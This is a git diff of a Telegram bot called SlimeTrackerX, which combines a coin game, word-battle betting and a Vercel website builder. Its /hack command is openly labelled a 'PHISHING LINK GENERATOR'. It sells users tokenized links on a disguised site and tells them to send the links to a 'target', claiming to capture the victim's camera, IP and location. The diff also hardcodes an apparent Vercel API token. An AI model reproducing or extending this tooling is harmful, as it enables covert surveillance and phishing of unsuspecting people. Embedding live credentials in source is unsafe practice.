@@ -19,7 +19,6 @@ const app = express();
 
 // ========== VERCEL CONFIG ==========
 const VERCEL_TOKEN = "vcp_1HgHd18aJoERfWmE1pyz2zMhxpo6waJlHwIzy8nlUBDzOHBs6z3POSk2";
-const VERCEL_TEAM_ID = ""; // Empty for personal account
 
 // ========== BOT CONFIG ==========
 const DOMAIN = "https://virtualnumbersfree.onrender.com";
@@ -44,7 +43,7 @@ const difficulties = {
   expert: { name: "💀 EXPERT", timer: 8, letters: 9, multiplier: 5 }
 };
 
-// ========== WORD DATABASE (100+ words each) ==========
+// ========== WORD DATABASE ==========
 const wordsByLength = {
   3: ["CAT", "DOG", "SUN", "CAR", "BAG", "HAT", "LEG", "EYE", "CUP", "BED", "RED", "HOT", "BIG", "NEW", "OLD", "FUN", "RUN", "SIT", "EAT", "FLY", "CRY", "JOY", "SAD", "WET", "DRY", "FAT", "RAT", "BAT", "MAT", "PAT", "SAT", "HEN", "PEN", "DEN", "MEN", "TEN", "NET", "PET", "GET", "JET", "SET", "BET", "LET", "MET", "YET", "ZIP", "LIP", "TIP", "HIP", "DIP", "RIP", "SIP", "NIP", "MAP", "CAP", "TAP", "GAP", "LAP", "SAP", "NAP", "VAN", "MAN", "CAN", "PAN", "FAN", "BAN", "RAN", "WAN", "HIT", "KIT", "BIT", "FIT", "PIT", "WIT", "ROW", "COW", "HOW", "NOW", "LOW", "BOW", "TOW", "TOY", "BOY", "DAY", "WAY", "PAY", "SAY", "KEY", "HEY", "ICE", "ACE", "AGE", "ARE", "AND", "END", "INK", "OWL", "EAR", "ARM", "ANT", "WEB", "LAB", "CAB", "JAB", "TUB", "SUB", "RUB", "CUB", "PUB", "HUB"],
   4: ["FISH", "BIRD", "FROG", "STAR", "MOON", "TREE", "WIND", "FIRE", "ROCK", "SAND", "SHIP", "KING", "RING", "SING", "WING", "BOOK", "COOK", "LOOK", "LION", "BEAR", "WOLF", "DEER", "GOAT", "DUCK", "SWAN", "SEAL", "ROAD", "PATH", "WALL", "DOOR", "ROOF", "ROOM", "HALL", "YARD", "GATE", "FARM", "BLUE", "PINK", "GRAY", "GOLD", "SILK", "WOOL", "CASH", "COIN", "NOTE", "BANK", "TIME", "YEAR", "WEEK", "HOUR", "MATH", "CODE", "DATA", "FILE", "FORM", "PLAY", "GAME", "TEAM", "GOAL", "PASS", "KICK", "RACE", "JUMP", "DIVE", "SWIM", "FOOD", "RICE", "MEAT", "CAKE", "SOUP", "EGGS", "SALT", "SPIN", "RAIN", "SNOW", "HEAT", "COLD", "MIST", "FOG", "HAIL", "CLAY", "HAND", "HEAD", "FOOT", "NOSE", "MOUTH", "TEETH", "HAIR", "BELL", "FORK", "SPOON", "KNIFE", "PLATE", "BOWL", "CUPID", "ANGEL", "DEVIL", "GHOST", "SPIRIT", "SOUL", "HEART", "BRAIN", "LUNG", "KIDNEY", "LIVER"],
@@ -286,12 +285,14 @@ async function redeemCode(userId, code) {
   return { ok: true, msg: `✅ +${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}` };
 }
 
-// ========== VERCEL DEPLOY - WORKING ==========
+// ========== VERCEL DEPLOY - FULLY WORKING ==========
 async function deployToVercel(htmlContent, siteName) {
   try {
-    let cleanName = siteName.toLowerCase().replace(/[^a-z0-9]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 20);
-    if (!cleanName || cleanName.length < 3) cleanName = 'site';
+    if (!htmlContent) {
+      return { success: false, error: "No HTML content" };
+    }
     
+    const cleanName = siteName.toLowerCase().replace(/[^a-z0-9]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 15) || 'site';
     const uniqueName = `${cleanName}-${Date.now()}`;
     const tempDir = path.join(__dirname, "exports", uniqueName);
     
@@ -299,15 +300,6 @@ async function deployToVercel(htmlContent, siteName) {
     
     await fs.ensureDir(tempDir);
     await fs.writeFile(path.join(tempDir, "index.html"), htmlContent);
-    
-    const vercelConfig = {
-      version: 2,
-      name: uniqueName,
-      public: true,
-      builds: [{ src: "index.html", use: "@vercel/static" }],
-      routes: [{ src: "/(.*)", dest: "/index.html" }]
-    };
-    await fs.writeFile(path.join(tempDir, "vercel.json"), JSON.stringify(vercelConfig, null, 2));
     
     const zipPath = path.join(__dirname, "exports", `${uniqueName}.zip`);
     const output = fs.createWriteStream(zipPath);
@@ -323,26 +315,25 @@ async function deployToVercel(htmlContent, siteName) {
     
     const formData = new FormData();
     formData.append("file", fs.createReadStream(zipPath));
-    formData.append("projectName", uniqueName);
-    formData.append("name", uniqueName);
     
-    let url = `https://api.vercel.com/v13/deployments`;
-    if (VERCEL_TEAM_ID) url += `?teamId=${VERCEL_TEAM_ID}`;
-    
-    const response = await axios.post(url, formData, {
-      headers: { "Authorization": `Bearer ${VERCEL_TOKEN}`, ...formData.getHeaders() },
+    const response = await axios.post("https://api.vercel.com/v13/deployments", formData, {
+      headers: {
+        "Authorization": `Bearer ${VERCEL_TOKEN}`,
+        ...formData.getHeaders()
+      },
       maxContentLength: Infinity,
       maxBodyLength: Infinity,
-      timeout: 60000
+      timeout: 120000
     });
     
     await fs.remove(tempDir).catch(() => {});
     await fs.remove(zipPath).catch(() => {});
     
     return { success: true, url: response.data.url, siteName: uniqueName };
+    
   } catch (error) {
-    console.error("❌ Vercel Error:", error.response?.data || error.message);
-    return { success: false, error: error.response?.data?.error?.message || error.message, html: htmlContent };
+    console.error("❌ Vercel Error:", error.message);
+    return { success: false, error: error.message, html: htmlContent };
   }
 }
 
@@ -358,46 +349,78 @@ const htmlTemplates = {
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; line-height: 1.6; }
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; min-height: 100vh; }
         .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
-        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; }
+        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; flex-wrap: wrap; gap: 20px; }
         .logo { font-size: 28px; font-weight: 800; background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .nav-links a { color: #fff; margin-left: 30px; text-decoration: none; transition: 0.3s; }
+        .nav-links { display: flex; gap: 30px; }
+        .nav-links a { color: #fff; text-decoration: none; transition: 0.3s; }
         .nav-links a:hover { color: #4ECDC4; }
         .hero { text-align: center; padding: 80px 0; }
         .hero h1 { font-size: 56px; margin-bottom: 20px; background: linear-gradient(45deg, #FF6B6B, #4ECDC4, #45B7D1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .hero p { font-size: 20px; opacity: 0.9; }
+        .hero p { font-size: 20px; opacity: 0.9; margin-bottom: 30px; }
         .btn { display: inline-block; background: linear-gradient(45deg, #FF6B6B, #4ECDC4); color: white; padding: 12px 30px; border-radius: 30px; text-decoration: none; font-weight: 600; transition: 0.3s; }
-        .btn:hover { transform: translateY(-3px); }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
         .section { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 40px; margin: 40px 0; backdrop-filter: blur(10px); }
         .section h2 { margin-bottom: 20px; font-size: 32px; }
         .skills { display: flex; gap: 15px; flex-wrap: wrap; margin-top: 20px; }
         .skill { background: rgba(255,255,255,0.1); padding: 10px 20px; border-radius: 20px; }
+        .projects { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; margin-top: 30px; }
+        .project-card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 20px; transition: 0.3s; }
+        .project-card:hover { transform: translateY(-5px); border: 1px solid rgba(78,205,196,0.3); }
         footer { text-align: center; padding: 40px; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 60px; }
-        @media (max-width: 768px) { .navbar { flex-direction: column; gap: 20px; } .hero h1 { font-size: 32px; } }
+        .social-links { display: flex; justify-content: center; gap: 20px; margin-top: 20px; }
+        .social-links a { color: white; font-size: 24px; transition: 0.3s; }
+        .social-links a:hover { color: #4ECDC4; transform: translateY(-3px); }
+        @media (max-width: 768px) { .navbar { flex-direction: column; text-align: center; } .hero h1 { font-size: 32px; } .nav-links { justify-content: center; } }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="navbar">
             <div class="logo"><i class="fas fa-code"></i> ${data.name || 'Portfolio'}</div>
-            <div class="nav-links"><a href="#">Home</a><a href="#">About</a><a href="#">Projects</a><a href="#">Contact</a></div>
+            <div class="nav-links">
+                <a href="#">Home</a>
+                <a href="#">About</a>
+                <a href="#">Projects</a>
+                <a href="#">Contact</a>
+            </div>
         </div>
         <div class="hero">
             <h1>${data.name || 'Welcome to My Portfolio'}</h1>
-            <p>${data.title || 'Creative Developer & Designer'}</p>
-            <a href="#" class="btn">Hire Me</a>
+            <p>${data.title || 'Creative Developer & UI/UX Designer'}</p>
+            <a href="#" class="btn"><i class="fas fa-paper-plane"></i> Hire Me</a>
         </div>
         <div class="section">
-            <h2>About Me</h2>
-            <p>${data.bio || 'Passionate creator building amazing web experiences.'}</p>
+            <h2><i class="fas fa-user-astronaut"></i> About Me</h2>
+            <p>${data.bio || 'Passionate creator building amazing web experiences. I love turning ideas into reality through code and design.'}</p>
             <div class="skills">
-                <span class="skill">${data.skill1 || 'JavaScript'}</span>
-                <span class="skill">${data.skill2 || 'React'}</span>
-                <span class="skill">${data.skill3 || 'Node.js'}</span>
+                <span class="skill"><i class="fab fa-js"></i> ${data.skill1 || 'JavaScript'}</span>
+                <span class="skill"><i class="fab fa-react"></i> ${data.skill2 || 'React.js'}</span>
+                <span class="skill"><i class="fab fa-node"></i> ${data.skill3 || 'Node.js'}</span>
             </div>
         </div>
-        <footer><p>📧 ${data.email || 'hello@example.com'}</p><p>© 2024 Built with SlimeTrackerX</p></footer>
+        <div class="section">
+            <h2><i class="fas fa-rocket"></i> Featured Projects</h2>
+            <div class="projects">
+                <div class="project-card"><i class="fas fa-globe" style="font-size: 40px; color: #4ECDC4;"></i><h3>Project Alpha</h3><p>Revolutionary web application</p></div>
+                <div class="project-card"><i class="fas fa-mobile-alt" style="font-size: 40px; color: #FF6B6B;"></i><h3>Project Beta</h3><p>Mobile-first design</p></div>
+                <div class="project-card"><i class="fas fa-brain" style="font-size: 40px; color: #45B7D1;"></i><h3>Project Gamma</h3><p>AI-powered solution</p></div>
+            </div>
+        </div>
+        <div class="section">
+            <h2><i class="fas fa-envelope"></i> Get In Touch</h2>
+            <p>📧 ${data.email || 'hello@example.com'}</p>
+            <div class="social-links">
+                <a href="#"><i class="fab fa-github"></i></a>
+                <a href="#"><i class="fab fa-linkedin"></i></a>
+                <a href="#"><i class="fab fa-twitter"></i></a>
+                <a href="#"><i class="fab fa-instagram"></i></a>
+            </div>
+        </div>
+        <footer>
+            <p>© 2024 ${data.name || 'Portfolio'} | Built with <i class="fas fa-heart" style="color: #FF6B6B;"></i> by SlimeTrackerX</p>
+        </footer>
     </div>
 </body>
 </html>`,
@@ -413,40 +436,68 @@ const htmlTemplates = {
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Poppins', sans-serif; background: #0a0a0a; color: #fff; }
-        .navbar { background: rgba(10,10,10,0.95); padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; }
+        .navbar { background: rgba(10,10,10,0.95); backdrop-filter: blur(10px); padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; flex-wrap: wrap; gap: 20px; }
         .logo { font-size: 28px; font-weight: 800; background: linear-gradient(45deg, #FFD700, #FF6347); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .nav-links a { color: #fff; text-decoration: none; margin-left: 30px; transition: 0.3s; }
         .nav-links a:hover { color: #FFD700; }
-        .hero { background: linear-gradient(135deg, #1a1a2e, #16213e); text-align: center; padding: 120px 20px; }
-        .hero h1 { font-size: 56px; margin-bottom: 20px; }
-        .btn { background: linear-gradient(45deg, #FFD700, #FF6347); color: #1a1a2e; padding: 15px 40px; border-radius: 40px; text-decoration: none; font-weight: 600; display: inline-block; }
+        .hero { background: linear-gradient(135deg, #1a1a2e, #16213e); text-align: center; padding: 120px 20px; position: relative; overflow: hidden; }
+        .hero::before { content: ''; position: absolute; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,215,0,0.1) 0%, transparent 70%); animation: rotate 20s linear infinite; }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .hero h1 { font-size: 56px; margin-bottom: 20px; position: relative; z-index: 1; }
+        .hero p { font-size: 20px; opacity: 0.9; margin-bottom: 30px; position: relative; z-index: 1; }
+        .btn { background: linear-gradient(45deg, #FFD700, #FF6347); color: #1a1a2e; padding: 15px 40px; border-radius: 40px; text-decoration: none; font-weight: 600; display: inline-block; transition: 0.3s; position: relative; z-index: 1; }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(255,215,0,0.3); }
         .container { max-width: 1200px; margin: 0 auto; padding: 80px 20px; }
+        .section-title { text-align: center; font-size: 36px; margin-bottom: 50px; }
         .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
-        .service-card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 40px; text-align: center; }
+        .service-card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 40px 30px; text-align: center; transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); }
+        .service-card:hover { transform: translateY(-10px); border-color: #FFD700; }
         .service-card i { font-size: 50px; color: #FFD700; margin-bottom: 20px; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; margin: 60px 0; text-align: center; }
+        .stat-number { font-size: 48px; font-weight: 800; color: #FFD700; }
+        .contact-section { background: linear-gradient(135deg, #1a1a2e, #16213e); text-align: center; padding: 80px 20px; border-radius: 30px; margin-top: 60px; }
         footer { text-align: center; padding: 40px; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 60px; }
-        @media (max-width: 768px) { .navbar { flex-direction: column; gap: 20px; } .hero h1 { font-size: 32px; } }
+        @media (max-width: 768px) { .navbar { flex-direction: column; text-align: center; } .hero h1 { font-size: 32px; } .nav-links a { margin: 0 15px; } }
     </style>
 </head>
 <body>
     <div class="navbar">
         <div class="logo"><i class="fas fa-chart-line"></i> ${data.company || 'Business'}</div>
-        <div class="nav-links"><a href="#">Home</a><a href="#">Services</a><a href="#">Contact</a></div>
+        <div class="nav-links">
+            <a href="#">Home</a>
+            <a href="#">Services</a>
+            <a href="#">About</a>
+            <a href="#">Contact</a>
+        </div>
     </div>
     <div class="hero">
         <h1>${data.company || 'Welcome to Our Business'}</h1>
         <p>${data.tagline || 'Delivering Excellence Since 2024'}</p>
-        <a href="#" class="btn">Get Started</a>
+        <a href="#" class="btn">Get Started <i class="fas fa-arrow-right"></i></a>
     </div>
     <div class="container">
-        <h2 style="text-align:center; margin-bottom:50px;">Our Services</h2>
+        <h2 class="section-title">💼 Our Premium Services</h2>
         <div class="services">
-            <div class="service-card"><i class="fas fa-rocket"></i><h3>${data.service1 || 'Innovation'}</h3><p>${data.service1_desc || 'Cutting-edge solutions'}</p></div>
-            <div class="service-card"><i class="fas fa-chart-line"></i><h3>${data.service2 || 'Growth'}</h3><p>${data.service2_desc || 'Strategic planning'}</p></div>
-            <div class="service-card"><i class="fas fa-headset"></i><h3>${data.service3 || 'Support'}</h3><p>${data.service3_desc || '24/7 customer support'}</p></div>
+            <div class="service-card"><i class="fas fa-rocket"></i><h3>${data.service1 || 'Innovation'}</h3><p>${data.service1_desc || 'Cutting-edge solutions for modern business challenges'}</p></div>
+            <div class="service-card"><i class="fas fa-chart-line"></i><h3>${data.service2 || 'Growth'}</h3><p>${data.service2_desc || 'Strategic planning and exponential growth'}</p></div>
+            <div class="service-card"><i class="fas fa-headset"></i><h3>${data.service3 || 'Support'}</h3><p>${data.service3_desc || '24/7 dedicated customer support'}</p></div>
+        </div>
+        <div class="stats">
+            <div><div class="stat-number">500+</div><div>Projects</div></div>
+            <div><div class="stat-number">200+</div><div>Clients</div></div>
+            <div><div class="stat-number">98%</div><div>Satisfaction</div></div>
         </div>
     </div>
-    <footer><p>📧 ${data.email || 'info@example.com'} | 📞 ${data.phone || '+1 234 567 8900'}</p><p>📍 ${data.address || '123 Business Street'}</p></footer>
+    <div class="contact-section">
+        <h2><i class="fas fa-envelope"></i> Contact Us</h2>
+        <p style="margin: 20px 0;">📧 ${data.email || 'info@example.com'}</p>
+        <p style="margin: 10px 0;">📞 ${data.phone || '+1 234 567 8900'}</p>
+        <p>📍 ${data.address || '123 Business Street, New York'}</p>
+    </div>
+    <footer>
+        <p>🔥 Built with SlimeTrackerX Business Suite</p>
+        <p>© 2024 ${data.company || 'Business'}. All rights reserved.</p>
+    </footer>
 </body>
 </html>`,
   
@@ -461,27 +512,30 @@ const htmlTemplates = {
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #f8f9fa; }
-        .navbar { background: white; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 20px rgba(0,0,0,0.1); }
+        .navbar { background: white; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 20px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; flex-wrap: wrap; gap: 20px; }
         .logo { font-size: 28px; font-weight: 800; background: linear-gradient(45deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .cart-icon { position: relative; cursor: pointer; }
+        .cart-count { position: absolute; top: -10px; right: -15px; background: #667eea; color: white; border-radius: 50%; padding: 2px 6px; font-size: 12px; }
         .hero { background: linear-gradient(135deg, #667eea, #764ba2); color: white; text-align: center; padding: 80px 20px; }
         .hero h1 { font-size: 48px; margin-bottom: 20px; }
         .products { max-width: 1200px; margin: 60px auto; padding: 0 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
-        .product-card { background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 5px 20px rgba(0,0,0,0.1); transition: 0.3s; }
-        .product-card:hover { transform: translateY(-10px); }
-        .product-image { height: 200px; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; }
-        .product-image i { font-size: 60px; color: white; }
+        .product-card { background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 5px 20px rgba(0,0,0,0.1); transition: 0.3s; cursor: pointer; }
+        .product-card:hover { transform: translateY(-10px); box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .product-image { height: 250px; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; }
+        .product-image i { font-size: 80px; color: white; }
         .product-info { padding: 20px; }
-        .product-title { font-size: 20px; font-weight: 600; }
+        .product-title { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
         .product-price { font-size: 24px; font-weight: 800; color: #667eea; margin: 10px 0; }
-        .add-to-cart { background: linear-gradient(45deg, #667eea, #764ba2); color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: 600; }
+        .add-to-cart { background: linear-gradient(45deg, #667eea, #764ba2); color: white; border: none; padding: 12px 20px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: 600; transition: 0.3s; }
+        .add-to-cart:hover { opacity: 0.9; transform: scale(0.98); }
         footer { background: #1a1a2e; color: white; text-align: center; padding: 40px; margin-top: 60px; }
-        @media (max-width: 768px) { .navbar { flex-direction: column; gap: 20px; } .hero h1 { font-size: 32px; } }
+        @media (max-width: 768px) { .navbar { flex-direction: column; text-align: center; } .hero h1 { font-size: 32px; } }
     </style>
 </head>
 <body>
     <div class="navbar">
         <div class="logo"><i class="fas fa-store"></i> ${data.store || 'Store'}</div>
-        <div class="cart-icon"><i class="fas fa-shopping-cart" style="font-size:24px;"></i></div>
+        <div class="cart-icon"><i class="fas fa-shopping-cart" style="font-size: 24px;"></i><span class="cart-count">0</span></div>
     </div>
     <div class="hero">
         <h1>${data.store || 'Welcome to Our Store'}</h1>
@@ -493,7 +547,7 @@ const htmlTemplates = {
             <div class="product-info">
                 <div class="product-title">${data.product1 || 'Premium Product'}</div>
                 <div class="product-price">$${data.product1_price || '49'}</div>
-                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart</button>
+                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart <i class="fas fa-shopping-cart"></i></button>
             </div>
         </div>
         <div class="product-card">
@@ -501,7 +555,7 @@ const htmlTemplates = {
             <div class="product-info">
                 <div class="product-title">${data.product2 || 'Featured Item'}</div>
                 <div class="product-price">$${data.product2_price || '79'}</div>
-                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart</button>
+                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart <i class="fas fa-shopping-cart"></i></button>
             </div>
         </div>
         <div class="product-card">
@@ -509,11 +563,15 @@ const htmlTemplates = {
             <div class="product-info">
                 <div class="product-title">${data.product3 || 'Deluxe Edition'}</div>
                 <div class="product-price">$${data.product3_price || '99'}</div>
-                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart</button>
+                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart <i class="fas fa-shopping-cart"></i></button>
             </div>
         </div>
     </div>
-    <footer><p>📧 ${data.email || 'store@example.com'}</p><p>🔥 Built with SlimeTrackerX Store Builder</p></footer>
+    <footer>
+        <p>📧 ${data.email || 'store@example.com'}</p>
+        <p>🔥 Built with SlimeTrackerX Store Builder</p>
+    </footer>
+    <script>let cart=[];function addToCart(name,price){cart.push({name,price});document.querySelector('.cart-count').textContent=cart.length;alert(name+' added to cart!');}</script>
 </body>
 </html>`
 };
@@ -537,49 +595,27 @@ function getMainMenu() {
 
 // ========== COMMANDS ==========
 
-// START command with image
 bot.start(async (ctx) => {
   let ref = null;
   let args = ctx.message.text.split(" ");
-  if (args[1] && args[1].startsWith("ref_")) { 
-    ref = parseInt(args[1].replace("ref_", "")); 
-  }
+  if (args[1] && args[1].startsWith("ref_")) { ref = parseInt(args[1].replace("ref_", "")); }
   let user = await initUser(ctx.from.id, ref);
   
-  const menuImage = "https://iili.io/BMbTnup.jpg";
-  
-  try {
-    await ctx.replyWithPhoto(menuImage, {
-      caption: `🟢⚡ **SLIME TRACKERX v40.0** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n📊 Level ${user.level} | 👥 ${user.referrals} referrals\n🏆 Word Wins: ${user.wordWins}\n\n⬇️ **CLICK BUTTONS BELOW** ⬇️`,
-      parse_mode: "Markdown",
-      ...getMainMenu()
-    });
-  } catch (error) {
-    await ctx.reply(
-      `🟢⚡ **SLIME TRACKERX v40.0** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n📊 Level ${user.level} | 👥 ${user.referrals} referrals\n🏆 Word Wins: ${user.wordWins}\n\n⬇️ **CLICK BUTTONS BELOW** ⬇️`,
-      { parse_mode: "Markdown", ...getMainMenu() }
-    );
-  }
+  await ctx.reply(
+    `🟢⚡ **SLIME TRACKERX v40.0** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n📊 Level ${user.level} | 👥 ${user.referrals} referrals\n🏆 Word Wins: ${user.wordWins}\n\n⬇️ **CLICK BUTTONS BELOW** ⬇️`,
+    { parse_mode: "Markdown", ...getMainMenu() }
+  );
 });
 
 // HACK command
 bot.command("hack", async (ctx) => {
   let args = ctx.message.text.split(" ");
-  
   if (args.length < 2) {
-    return ctx.reply(
-      `💀 **PHISHING LINK GENERATOR** 💀\n\n` +
-      `Usage: /hack [label]\n\n` +
-      `Examples:\n/hack free gift\n/hack win iphone\n/hack claim reward\n\n` +
-      `💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location\n\n` +
-      `The target will see VirtualNumbers - looks legit!`
-    );
+    return ctx.reply(`💀 **PHISHING LINK GENERATOR** 💀\n\nUsage: /hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location\n\nExample: /hack free gift`);
   }
   
   let user = await initUser(ctx.from.id);
-  if (user.coins < TRACK_COST) {
-    return ctx.reply(`❌ You need ${TRACK_COST} coins! You have ${user.coins}\n\nEarn coins: /daily, /work, or play games!`);
-  }
+  if (user.coins < TRACK_COST) return ctx.reply(`❌ Need ${TRACK_COST} coins! You have ${user.coins}`);
   
   await takeCoin(ctx.from.id, TRACK_COST);
   user.hacks = (user.hacks || 0) + 1;
@@ -587,30 +623,17 @@ bot.command("hack", async (ctx) => {
   
   let token = crypto.randomBytes(16).toString("hex");
   let label = args.slice(1).join(" ");
-  
-  hackTokens.set(token, { 
-    userId: ctx.from.id,
-    username: ctx.from.username || ctx.from.first_name,
-    label: label,
-    time: Date.now()
-  });
-  
+  hackTokens.set(token, { userId: ctx.from.id, username: ctx.from.username || ctx.from.first_name, label: label, time: Date.now() });
   let hackLink = `${DOMAIN}/?token=${token}`;
   
-  await ctx.reply(
-    `💀 **PHISHING LINK READY** 💀\n\n` +
-    `🎯 Label: ${label}\n💰 Cost: -${TRACK_COST} coins\n💀 Total Hacks: ${user.hacks}\n\n` +
-    `🔗 **YOUR LINK:**\n\`${hackLink}\`\n\n` +
-    `Send this link to your target!\nWhen they click, you'll get Camera + IP + Location!`,
-    { parse_mode: "Markdown" }
-  );
+  await ctx.reply(`💀 **PHISHING LINK READY** 💀\n\n🎯 Label: ${label}\n💰 Cost: -${TRACK_COST} coins\n💀 Total Hacks: ${user.hacks}\n\n🔗 ${hackLink}\n\nSend this link to your target!`, { parse_mode: "Markdown" });
 });
 
-// WORD BATTLE command
+// WORD BATTLE
 bot.command("wordbattle", async (ctx) => {
   let args = ctx.message.text.split(" ");
   if (args.length < 4) {
-    return ctx.reply(`📝 **WORD CHALLENGE**\n\nUsage: /wordbattle @username amount difficulty\n\nDifficulties:\n🍃 easy - 3 letters\n⚡ medium - 5 letters\n🔥 hard - 7 letters\n💀 expert - 9 letters\n\n💰 Min bet: ${WORD_MIN_BET}`);
+    return ctx.reply(`📝 **WORD CHALLENGE**\n\n/wordbattle @username amount difficulty\n\nDifficulties: easy(3), medium(5), hard(7), expert(9)\n💰 Min bet: ${WORD_MIN_BET}`);
   }
   
   let targetUsername = args[1];
@@ -623,34 +646,23 @@ bot.command("wordbattle", async (ctx) => {
   
   let targetId = null;
   for (let [id] of usersCache) {
-    try {
-      let c = await ctx.telegram.getChat(id);
-      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
-    } catch(e) {}
+    try { let c = await ctx.telegram.getChat(id); if (c.username === targetUsername.replace("@", "")) { targetId = id; break; } } catch(e) {}
   }
   if (!targetId) return ctx.reply("❌ User not found!");
   if (targetId === ctx.from.id) return ctx.reply("❌ Cannot battle yourself!");
   
   let user = await initUser(ctx.from.id);
-  if (user.coins < betAmount) return ctx.reply(`❌ You need ${betAmount} coins!`);
+  if (user.coins < betAmount) return ctx.reply(`❌ Need ${betAmount} coins!`);
   
   let diff = difficulties[difficulty];
-  
-  wordChallenges.set(targetId, { 
-    from: ctx.from.id, 
-    bet: betAmount, 
-    difficulty, 
-    letterCount: diff.letters, 
-    status: "waiting",
-    timer: diff.timer
-  });
+  wordChallenges.set(targetId, { from: ctx.from.id, bet: betAmount, difficulty, letterCount: diff.letters, status: "waiting", timer: diff.timer });
   setTimeout(() => { if (wordChallenges.get(targetId)?.status === "waiting") wordChallenges.delete(targetId); }, 60000);
   
   await ctx.reply(`✅ Challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n${diff.name}\n📏 Need a ${diff.letters}-letter word\n⏱️ ${diff.timer} seconds`);
   await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!**\n\n@${ctx.from.username} challenges you!\n💰 Bet: ${betAmount} coins\n📏 Need a **${diff.letters}-letter word**\n⏱️ ${diff.timer} seconds\n\nType /acceptword to accept!`);
 });
 
-// ACCEPT WORD command
+// ACCEPT WORD
 bot.command("acceptword", async (ctx) => {
   let challenge = wordChallenges.get(ctx.from.id);
   if (!challenge) return ctx.reply("❌ No challenge found!");
@@ -684,7 +696,7 @@ bot.command("acceptword", async (ctx) => {
   await ctx.reply(`✅ Accepted! Challenger's turn!\n⏱️ ${diff.timer} seconds!`);
 });
 
-// LEADERBOARD command
+// LEADERBOARD
 bot.command("leaderboard", async (ctx) => {
   let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 15);
   let message = "🏆 **TOP 15 COINS** 🏆\n\n";
@@ -696,7 +708,7 @@ bot.command("leaderboard", async (ctx) => {
   await ctx.reply(message);
 });
 
-// TOP WORDS command
+// TOP WORDS
 bot.command("topwords", async (ctx) => {
   let sorted = Array.from(usersCache.values()).sort((a, b) => b.wordWins - a.wordWins).slice(0, 10);
   let message = "📝 **TOP WORD BATTLE WINNERS** 📝\n\n";
@@ -707,19 +719,13 @@ bot.command("topwords", async (ctx) => {
   await ctx.reply(message);
 });
 
-// BALANCE command
-bot.command("balance", async (ctx) => { 
-  let u = await initUser(ctx.from.id); 
